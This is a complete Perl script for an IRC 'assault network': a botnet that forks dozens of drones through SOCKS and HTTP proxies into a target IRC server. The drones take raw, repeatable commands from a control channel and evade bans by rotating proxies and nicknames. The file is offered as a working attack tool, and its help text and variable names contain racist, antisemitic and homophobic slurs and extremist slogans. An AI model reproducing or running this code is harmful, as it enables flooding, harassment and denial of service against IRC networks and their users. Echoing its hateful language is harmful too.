#!/usr/bin/perl
#
#

# {{{ original copyrights & info

# This is proxysuite, written in GNU/PURL
# by Jmax, of bantown and the GNAA.
# It gathers and tests proxies, both http and socks4

# This product is licensed under the BPL.
# You should have recieved a copy of the
# license with this program

# el8 tr0ll c0dez by Jmax [ BANTOWN irc.bantown.com #bantown ] [ GNAA irc.gnaa.us #gnaa ]


# ASIAN 2.0 by Jmax
#
# I have made many modifications:
#  - Use of command line arguments as opposed to editing the script itself.
#  - Adding a SOCKS routine, instead of using Net::SOCKS (no non-standard modules will be required)
#  - Adding a random nick/fullname/ircname routine, instead of using Crypt::RandPasswd (no non-standard modules will be required)
#  - Improved fork routine/library

# Must be run on a POSIX-compliant system, with perl.
# note that there's a bug in the way that COMPUTER MACHINEZ COMPUTE,
# and therefore proxies can't be shared between forks.  Oh well.

# The original header (for historical reasons)
# is as follows (NOTE: syntax here is _incorrect_):
# -----------------------------------------------
# ASIAN by Rucas
# Automated Synchronous IRC Assault Network
# Based on AYSYN by mef
#
# Make sure to put a SOCKS5 proxy list in proxies.txt in the same
# directory as this script.  If you'd like to use tor, you can put
# the correct info on one line in proxies.txt and this app will
# still function properly (although generally tor sucks)
#
# All bots join $g_channel and are issued raw irc commands from there
# using syntax "all PRIVMSG Rucas lol you fail it" for all bots or
# "botname PRIVMSG Rucas lol failure" and such.
#
# Testing of an early version of this script is the reason that
# Freenode now checks for open SOCKS proxies.
# -----------------------------------------------

# }}}

use warnings;
use strict;

use IO::Socket;
use IO::Handle;
use POSIX qw(:signal_h :sys_wait_h);  # fork

use Time::HiRes;
# use Data::Dumper;

use vars qw($VERSION);
$VERSION = "3.0";


# {{{ globals

my ($g_forkcount, $g_pid) = (0, undef);
my ($g_dead_nigger_storage, $g_maxfork) = (0, 40);

my ($g_network, $g_channel);

# }}}

# {{{ signal handlers

$SIG{INT} = sub { kill('INT', (getpgrp(0) * -1)) && exit; };
$SIG{CHLD} = sub { $g_dead_nigger_storage++ while(($g_pid = waitpid(-1, WNOHANG)) > 0); };

# }}}


# {{{ entry point

error("please run using the --help argument") unless $ARGV[0];
if ($ARGV[0] eq '--help') {
  show_usage(); exit 0;
} elsif ($ARGV[0] eq '--version') {
  show_version(); exit 0;
} else {
  error("please run using the --help argument") unless $ARGV[1];
  $g_network = $ARGV[0];
  $g_channel = $ARGV[1];
}

# }}}

# {{{ help/usage information

sub show_help {
  print "arab $VERSION by vxp\n".
        "!!! THIS ASIAN 2.1 BY JMAX HACKED BY HIZBULLAH !!!\n".
        "!!!       STOP SUPPORTING ISRAELI DOGS         !!!\n".
        "Based on code & ideas by Jmax, Rucas, abez and mef.\n".
        "\n".
        "\n".
        "  Invocation:\n".
        "      perl ".__FILE__." server \"#channel\"\n".
        "\n".
        "    XXX, and \"#channel\" is the control channel you want the bots\n".
        "    to join. Please note that some shells will interpret the # in\n".
        "    \"#channel\" as acomment, and will not send it to the script.\n".
        "    In this case, you may either use quotes, or escape the '#'.\n".
        "    I prefer quotes.\n".
        "    Note that a list of (nick|user|real) names is expected to reside\n".
        "    in ./names.txt\n".
        "\n".
        "\n".
        "  Usage:\n".
        "      all <raw IRC command> [space-delimited arguments] :[arguments with spaces]\n".
        "      <botname> <raw IRC command> [space-delimited arguments] :[arguments with spaces]\n".
        "      <botname>,<botname2>,... <raw IRC command> [space-delimited arguments] :[arguments with spaces]\n".
        "\n".
        "    Simply privmsg your command to the control channel, and the respective bots will follow.\n".
        "\n".
        "  Examples:\n".
        "      <~supers> all join #gnaa gnaa\n".
        "        All bots will join #gnaa using the key 'gnaa'\n".
        "      <~supers> all privmsg #gnaa :LOL HY LOL HY\n".
        "        All bots will say \"LOL HY LOL HY\" in #gnaa\n".
        "      <\@Rucas> fgtbot2235 nick NOT_FGT_LOL_GIMME_VOICE\n".
        "        The bot with the nick 'fgtbot2235' will change its nick to 'NOT_FGT_LOL_GIMME_VOICE'\n".
        "      <\@Jmax> NOT_FGT_LOL_GIMME_VOICE,dongs,loljews,nullo_is_a_fag_LOL part #gnaa :lol jews\n".
        "        The bots with the nicks 'NOT_FGT_LOL_GIMME_VOICE', 'dongs', 'loljews', and 'nullo_is_a_fag_LOL'\n".
        "        will part #gnaa with reason 'lol jews'\n".
        "\n".
        "\n".
        "    Enjoy. -- vxp\n";
}

# }}}

# {{{ version information

sub show_version {
  print "arab $VERSION by vxp\n".
        "!!! THIS ASIAN 2.1 BY JMAX HACKED BY HIZBULLAH !!!\n".
        "!!!       STOP SUPPORTING ISRAELI DOGS         !!!\n".
        "Based on code & ideas by Jmax, Rucas, abez and mef.\n".
        "\n";
}

# }}}


# load the proxy and name list(s)
my @g_proxies = load_proxy_list();
my @g_names = load_name_list();


# resolve the host name of the specified target ircd
# and cache it in a shared variable
my ($g_server_host, @g_server_ip);
$g_server_host = $ARGV[0];
@g_server_ip = resolve($g_server_host);


# fork(2) off up to $g_maxfork child processes to use as
# a pool for subsequent connection attempts
notice("Initializing (forking) bots");
for ($g_forkcount = 0;                  # $g_forkcount must _not_
     $g_forkcount < $g_maxfork;         # be local to here
     $g_forkcount++) {
  sleep 1;                              # so we don't overload ourselves

  if (!defined(my $g_pid = fork())) {   # fork
    error("couldn't fork: $!");         # die if fork fails
  } elsif ($g_pid == 0) {
    # in child:
    while (@g_proxies) {
      # grab a random proxy off the list...
      my $proxy_slot = int rand @g_proxies;
      my $proxy = $g_proxies[$proxy_slot];

      # ...attempt to establish a connection through it and
      # join a drone into the control channel on success.
      if(spawn_bot($proxy->{ip}, $proxy->{port}, $proxy->{type},
                   @g_server_ip, $g_server_host)) {
        # succeeded
      } else {
        # failed, delete proxy
        # XXX: not shared
        #delete $g_proxies[$proxy_slot];
      };

      sleep 10;   # to prevent throttling by IRCd
    }
    exit 0;

  } else {
    # in parent:

  }
}

sleep while ($g_dead_nigger_storage < $g_maxfork);
exit 666;


# {{{ load lists

sub load_proxy_list {
  my (@proxies);

  error("$@") unless push @proxies, load_socks4_list();
  error("$@") unless push @proxies, load_socks5_list();
  error("$@") unless push @proxies, load_http_list();
  return @proxies;
}

sub load_socks4_list {
  my (@proxies);

  open SOCKSFILE, "<", "./socks4.txt" or error("could not open SOCKS 4 proxy file socks4.txt: $!");
  while (<SOCKSFILE>) {
    chomp;
    my ($ip, $port) = /([^:]+):([0-9]+)/;
    push @proxies, ({ip => $ip, port => $port, type => '4'});
  }
  close(SOCKSFILE) or error("could not close SOCKS 4 proxy file socks4.txt: $!");

  notice("acquired ". scalar(@proxies) ." SOCKS 4 prox(y|ies).");
  return (@proxies);
}

sub load_socks5_list {
  my (@proxies);

  open SOCKSFILE, "<", "./socks5.txt" or error("could not open SOCKS 5 proxy file socks5.txt: $!");
  while (<SOCKSFILE>) {
    chomp;
    my ($ip, $port) = /([^:]+):([0-9]+)/;
    push @proxies, ({ip => $ip, port => $port, type => '5'});
  }
  close(SOCKSFILE) or error("could not close SOCKS 5 proxy file socks5.txt: $!");

  notice("acquired ". scalar(@proxies) ." SOCKS 5 prox(y|ies).");
  return (@proxies);
}

sub load_http_list {
  my (@proxies);

  open HTTPFILE, "<", "./http.txt" or error("could not open HTTP proxy file http.txt: $!");
  while (<HTTPFILE>) {
    chomp;
    my ($ip, $port) = /([^:]+):([0-9]+)/;
    push @proxies, ({ip => $ip, port => $port, type => 'h'});
  }
  close(HTTPFILE) or error("could not close HTTP proxy file http.txt: $!");

  notice("acquired ". scalar(@proxies) ." http prox(y|ies).");
  return (@proxies);
}

sub load_name_list {
  my (@names);

  open NAMESFILE, "<", "./names.txt" or error("could not open (nick|user|real) name list file names.txt: $!");
  while (<NAMESFILE>) {
    chomp;
    push @names, $_;
  };
  close(NAMESFILE) or error("could not close (nick|user|real) name list file names.txt: $!");

  notice("acquired ". scalar(@names) ." (nick|user|real) name(|s).");
  return (@names);
}

# }}}

# {{{ wrappers/tools

sub iptoipstr {
  my ($ip) = $_;
  my $d = $ip % 256; $ip -= $d; $ip /= 256;
  my $c = $ip % 256; $ip -= $c; $ip /= 256;
  my $b = $ip % 256; $ip -= $b; $ip /= 256;
  my $a = $ip;
  my $ipstr = "$a.$b.$c.$d";
  return $ipstr;
}

sub notice {
  my $notice = shift;
  print ">>>> ". $notice ."\n";
  return;
}

sub incoming {
  my ($nick, $line, $server) = @_;
  #printf("IRCd >>>> %-12s  ] %s\n", $nick, $line);
  return;
}

sub outgoing {
  my ($nick, $line, $server) = @_;
  #printf("IRCd <<<< %-12s  ] %s\n", $nick, $line);
  return;
}

sub warning {
  my $warning = shift;
  print "!!!! ". $warning ."\n";
  return;
}

sub error {
  my $error = shift;
  print "!!!! ". $error ."\n";
  exit 0;
}

# }}}

# {{{ per-drone logic

sub spawn_bot { # only return 0 if the proxy failed.  Otherwise, return 1;
  my ($proxy_ip, $proxy_port, $proxy_type,
      $remote_ip, $remote_host) = @_;
  my $nick = $g_names[int rand @g_names];
  my ($ident, $realname) = ($nick, $nick);
  my ($line, $sock, $altsock);
  my ($pingtime) = -1;

  eval {
    local $SIG{ALRM} = sub { die "alarm\n" }; # NB: \n required
    alarm 5;
    $sock = connect_to_proxy($proxy_ip, $proxy_port, $proxy_type,
                             $remote_ip, 6667);
    alarm 0;
  };
  if ($@) {
    error("unkown error: $@") unless $@ eq "alarm\n"; # propagate unexpected errors
    #warning("$proxy_ip:$proxy_port not responding, removing from list");
    #return 0;
  }

  $sock = connect_to_proxy($proxy_ip, $proxy_port, $proxy_type,
                           $remote_ip, 6667);
  return 0 unless $sock;

  print $sock "NICK $nick\r\n";
  outgoing($nick, "NICK $nick");
  print $sock "USER $ident * * :$realname\r\n";
  outgoing($nick, "USER $ident * * :$realname");
 
  while ($line = <$sock>) {
    chomp $line;
    # MIGHT WANNA ADJUST THESE vv
    next if $line =~ /372/; # ignore motd msgs
    incoming($nick, $line);
    last if $line =~ /376|422/; # end of motd or no motd
    return 0 if $line =~ /BANNED/i;
    return 0 if $line =~ /ERROR.*G.lined/i;
    return 0 if $line =~ /ERROR.*K.lined/i;
    return 1 if $line =~ /ERROR/i;
    return 1 if $line =~ /432/;
    return 1 if $line =~ /433/;
    # MIGHT WANNA ADJUST THESE ^^
    if ($line =~ /PING (.*)$/) {
      print $sock "PONG $1\r\n";
    }
  }
  print $sock "JOIN $g_channel\r\n";
  outgoing($nick, "JOIN $g_channel");
  notice("connected to $remote_host as $nick!$ident ($proxy_ip:$proxy_port:$proxy_type)");
  while ($line = <$sock>) {
    chomp $line;
    if ($line =~ /PING (.*)$/) {
      print $sock "PONG $1\r\n";
    } elsif ($line =~ /PONG/) {
      if($pingtime != -1) {
        print $sock "PRIVMSG $g_channel :PONG received after ". Time::HiRes::tv_interval($pingtime,[Time::HiRes::gettimeofday]) ." secs\r\n";
        $pingtime = -1;
      }
    } elsif ($line =~ /PRIVMSG $g_channel :\.status/i) {
      print $sock "PRIVMSG $g_channel :I'm $nick on $remote_host via $proxy_ip:$proxy_port (type: $proxy_type)\r\n";
    } elsif ($line =~ /PRIVMSG $g_channel :\.ping/i) {
      $pingtime = [Time::HiRes::gettimeofday];
      print $sock "PING :$pingtime\r\n";
    } elsif ($line =~ /PRIVMSG $g_channel :\.randnick/i ||
             $line =~ /432/ || $line =~ /433/) {
      incoming($nick, $line);
      $nick = $g_names[int rand @g_names];
      print $sock "NICK $nick\r\n";
      outgoing($nick, "NICK $nick");
    } elsif ($line =~ /PRIVMSG $g_channel :all(\/{1}[^ ]+) (.*)$/i) {
      my ($qualifiers, $cmds) = ($1, $2);
      my (undef, $repeat) = split /\//, $qualifiers;
      $cmds =~ s/\$nick/$nick/g;
      my (@cmds) = split /;/, $cmds;
      my $current = 0;
      while ($current < $repeat) {
        foreach my $cmd (@cmds) {
          if ($cmd =~ /\.randnick/) {
            $nick = $g_names[int rand @g_names];
            print $sock "NICK $nick\r\n";
          } else {
            print $sock "$cmd\r\n";
          }
        }
        $current++;
      }
    } elsif ($line =~ /PRIVMSG $g_channel :(?:\S*|\s*)$nick(?:\S*|\s*)(\/{1}[^ ]+) (.*)$/i) {
      my ($qualifiers, $cmds) = ($1, $2);
      my (undef, $repeat) = split /\//, $qualifiers;
      if ($cmds =~ /nick (\S*)/i) {
        $nick = $1;
      }
      my (@cmds) = split /;/, $cmds;
      my $current = 0;
      while ($current < $repeat) {
        foreach my $cmd (@cmds) {
          if ($cmd =~ /\.randnick/) {
            $nick = $g_names[int rand @g_names];
            print $sock "NICK $nick\r\n";
          } else {
            print $sock "$cmd\r\n";
          }
        }
        $current++;
      }
      incoming($nick, $line);
      outgoing($nick, $cmds);
    } elsif ($line =~ /^:(.*)!.* (PRIVMSG|NOTICE) $nick :(.*)$/i) {
      my $msg = $3;
      chomp $msg;
      if($2 eq 'PRIVMSG') {
        print $sock "PRIVMSG $g_channel :<$1> $msg\r\n";
      } else {
        print $sock "PRIVMSG $g_channel :-$1- $msg\r\n";
      }
    } elsif ($line =~ /473/) {
      # (channel is +i)
      alarm 5;
      $SIG{ALRM} = sub { print $sock "JOIN $g_channel\r\n";
                         alarm 0; };
    } else {
      incoming($nick, $line);
    }
  }
}

# }}}

# {{{ proxy protocol handshakes/tunnel establishment

sub connect_to_proxy {
  my ($proxy_ip, $proxy_port, $proxy_type,
      $remote_ip, $remote_port) = @_;
  if($proxy_type eq '4') {
    return connect_to_socks4_proxy($proxy_ip, $proxy_port,
                                   $remote_ip, $remote_port);
  } elsif($proxy_type eq '5') {
    return connect_to_socks5_proxy($proxy_ip, $proxy_port,
                                   $remote_ip, $remote_port);
  } elsif($proxy_type eq 'h') {
    return connect_to_http_proxy($proxy_ip, $proxy_port,
                                 $remote_ip, $remote_port);
  } else {
    error("unknown proxy type $proxy_type ($proxy_ip:$proxy_port)");
  }
}

sub connect_to_socks4_proxy {
  # see http://socks.permeo.com/protocol/socks4.protocol
  my ($socks_ip, $socks_port, $remote_ip, $remote_port) = @_;
  my $sock = IO::Socket::INET->new(
    PeerAddr => $socks_ip,
    PeerPort => $socks_port,
    Proto  => 'tcp',
    Timeout => '8'
  );
  return unless $sock;
  $sock->autoflush(1);
  print $sock pack('CCn', 4, 1, $remote_port) . inet_aton($remote_ip) . pack('x');
  my $received = '';
  while (read($sock, $received, 8) && (length($received) < 8)) {}
  my ($vn, $cd, $listen_port, $listen_addr) = unpack('CCnN', $received);
  return unless $cd;
  if ($cd != 90) {
    return;
  }
  return $sock;
}

sub connect_to_socks5_proxy {
  my ($socks_ip, $socks_port, $remote_ip, $remote_port) = @_;
  my $sock = IO::Socket::INET->new(
    PeerAddr => $socks_ip,
    PeerPort => $socks_port,
    Proto  => 'tcp',
    Timeout => '8'
  );
  return unless $sock;
  $sock->autoflush(1);

  print $sock pack('CCC', 5, 1, 0);
  my $received = '';
  while (read($sock, $received, 2) && (length($received) < 2)) {}
  my (undef, $method) = unpack('CC', $received);
  print "received: '$received'\n";
  return if $method == 0xFF;
  print $sock pack ('CCCCNn', 5, 1, 0, 1, inet_aton($remote_ip),
                              $remote_port);
  $received = '';
  while (read($sock, $received, 2) && (length($received) < 4)) {}
  my ($vn, $rep) = unpack('CC', $received);
  if ($rep != 0) {
    return;
  }
  return $sock;
}

sub connect_to_http_proxy {
  my ($http_ip, $http_port, $remote_ip, $remote_port) = @_;
  my $sock = IO::Socket::INET->new(
    PeerAddr => $http_ip,
    PeerPort => $http_port,
    Proto  => 'tcp',
    Timeout => '8'
  );
  return unless $sock;
  $sock->autoflush(1);

  print $sock "CONNECT $remote_ip:$remote_port HTTP/1.0\r\n\r\n";
  my $received = '';
  while (read($sock, $received, 12) && (length($received) < 12)) {}
  my (undef, $response) = split / /, $received;
  return if $received eq "";
  return if $response ne '200';

  while(read($sock, $received, 1)) {
    if($received eq "\n") {
      read($sock, $received, 1);
      if($received eq "\r") {
        read($sock, $received, 1);
        return $sock;
      }
    }
  }
  return;
}

sub resolve {
  my $host = shift;
  my (undef, undef, undef, undef, @servers) = gethostbyname($host);
  unless (@servers) {
    error("cannot resolve server $host: $?");
    return 0;
  }
  my @servers_ip;
  foreach my $server (@servers) {
    my ($a, $b, $c, $d) = unpack('C4', $server);
    my $server_ip = "$a.$b.$c.$d";
    push (@servers_ip, $server_ip);
  }
  return @servers_ip;
}

# }}}

# vim:ts=2
# vim:sw=2
# vim:expandtab
# vim:foldmethod=marker
